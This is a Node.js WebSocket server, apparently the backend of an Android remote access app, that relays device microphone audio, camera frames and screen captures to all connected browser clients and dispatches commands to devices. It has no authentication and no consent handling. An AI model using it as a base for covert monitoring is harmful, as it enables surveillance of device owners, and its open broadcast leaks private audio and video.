/**
 * Remote Access Server Gateway
 * Express + WebSocket Server for device management
 */

import express from 'express';
import { WebSocketServer } from 'ws';
import http from 'http';
import path from 'path';
import { fileURLToPath } from 'url';
import config from './config.js';
import adminRoutes from './routes/admin.js';
import { socketRegistry } from './services/socketRegistry.js';
import { commandDispatcher } from './services/commandDispatcher.js';
import HealthMonitor from './services/healthMonitor.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialize Express app
const app = express();
const server = http.createServer(app);

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// CORS for development
if (config.isDevelopment) {
    app.use((req, res, next) => {
        res.header('Access-Control-Allow-Origin', '*');
        res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
        next();
    });
}

// Serve static admin dashboard
app.use(express.static(path.join(__dirname, '../public')));

// API routes
app.use('/api', adminRoutes);

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        devices: socketRegistry.getDeviceCount(),
    });
});

// Initialize WebSocket Server
const wss = new WebSocketServer({
    server,
    path: '/',
});

console.log('[WebSocket] Server initialized');

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    console.log('[WebSocket] New connection from:', req.socket.remoteAddress);

    let deviceId = null;
    let heartbeatInterval = null;

    // Handle messages
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message.toString());

            // Normalize message structure (Android sends 'action', Frontend expects 'type')
            if (data.action && !data.type) {
                data.type = data.action;
            }

            // Inject deviceId if missing (for frontend)
            if (!data.deviceId && deviceId) {
                data.deviceId = deviceId;
            }

            // Log screen frame specifically for debugging
            if (data.type === 'screen_frame') {
                // console.log(`[WebSocket] Forwarding screen frame from ${deviceId} (${message.length} bytes)`);
            }

            // Handle browser identification
            if (data.type === 'identify') {
                // console.log(`[WebSocket] Browser identified: ${data.deviceId}`);
                return;
            }

            // Handle device registration
            if (data.type === 'register') {
                deviceId = data.deviceId;
                socketRegistry.register(deviceId, ws, data.metadata || {});

                // Send welcome message
                ws.send(JSON.stringify({
                    type: 'registered',
                    deviceId,
                    message: 'Successfully registered',
                }));

                // Start heartbeat monitoring
                heartbeatInterval = setInterval(() => {
                    if (ws.readyState === ws.OPEN) {
                        ws.send(JSON.stringify({ type: 'ping' }));
                    }
                }, config.websocket.pingInterval);

                return;
            }

            // Handle heartbeat from device
            if (data.type === 'heartbeat') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, {
                        lastHeartbeat: new Date().toISOString(),
                    });

                    // Send ACK
                    ws.send(JSON.stringify({ type: 'heartbeat_ack' }));
                }
                return;
            }

            // Handle heartbeat pong
            if (data.type === 'pong') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, {
                        lastSeen: new Date().toISOString(),
                    });
                }
                return;
            }

            // Handle device info updates
            if (data.type === 'device_info') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, data.info);
                }
                return;
            }

            // Handle mic audio chunks - forward to all browsers
            if (data.type === 'mic_chunk' && deviceId) {
                const msg = JSON.stringify(data);
                wss.clients.forEach(client => {
                    if (client !== ws && client.readyState === client.OPEN) {
                        client.send(msg);
                    }
                });
                return;
            }

            // Handle camera frames - forward to all browsers
            if (data.type === 'camera_frame' && deviceId) {
                const msg = JSON.stringify(data);
                wss.clients.forEach(client => {
                    if (client !== ws && client.readyState === client.OPEN) {
                        client.send(msg);
                    }
                });
                return;
            }

            // Handle screen frames - forward to all browsers (Remote Control)
            if (data.type === 'screen_frame' && deviceId) {
                // Log screen frame specifically for debugging
                console.log(`[WebSocket] Forwarding screen frame from ${deviceId} (${message.length} bytes)`);

                const msg = JSON.stringify(data);
                wss.clients.forEach(client => {
                    if (client !== ws && client.readyState === client.OPEN) {
                        client.send(msg);
                    }
                });
                return;
            }

            // Handle clean disconnection request
            if (data.type === 'disconnect' && deviceId) {
                console.log(`[WebSocket] Device ${deviceId} requesting clean disconnect`);
                socketRegistry.markOffline(deviceId);

                // Send acknowledgment
                ws.send(JSON.stringify({ type: 'disconnect_ack' }));
                return;
            }

            // Handle command responses
            if (data.replyTo) {
                commandDispatcher.handleResponse(data);
                return;
            }

            console.log('[WebSocket] Unknown message type:', data);
        } catch (error) {
            console.error('[WebSocket] Error parsing message:', error);
        }
    });

    // Handle disconnection
    ws.on('close', () => {
        console.log('[WebSocket] Client disconnected:', deviceId || 'unknown');

        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
        }

        if (deviceId) {
            commandDispatcher.clearDeviceCommands(deviceId);
            socketRegistry.markOffline(deviceId); // Mark offline, don't delete
        }
    });

    // Handle errors
    ws.on('error', (error) => {
        console.error('[WebSocket] Connection error:', error);
    });
});

// Initialize and start health monitor
const healthMonitor = new HealthMonitor(socketRegistry);
healthMonitor.start();

// Heartbeat to keep Render server alive (self-ping every 4 minutes)
if (config.isProduction) {
    setInterval(async () => {
        try {
            const res = await fetch(`https://remoteaccessapp.onrender.com/health`);
            const data = await res.json();
            console.log(`[KeepAlive] Ping OK - ${data.devices} device(s) connected`);
        } catch (err) {
            console.log('[KeepAlive] Self-ping failed:', err.message);
        }
    }, 4 * 60 * 1000); // Every 4 minutes
}

// Start server
server.listen(config.port, () => {
    console.log('='.repeat(50));
    console.log(`🚀 Remote Access Server Running`);
    console.log('='.repeat(50));
    console.log(`📡 HTTP Server: http://localhost:${config.port}`);
    console.log(`🔌 WebSocket: ws://localhost:${config.port}`);
    console.log(`🌍 Environment: ${config.nodeEnv}`);
    console.log(`📊 Admin Dashboard: http://localhost:${config.port}`);
    console.log('='.repeat(50));
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[Server] SIGTERM received, shutting down gracefully...');
    server.close(() => {
        console.log('[Server] Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('\n[Server] SIGINT received, shutting down gracefully...');
    server.close(() => {
        console.log('[Server] Server closed');
        process.exit(0);
    });
});
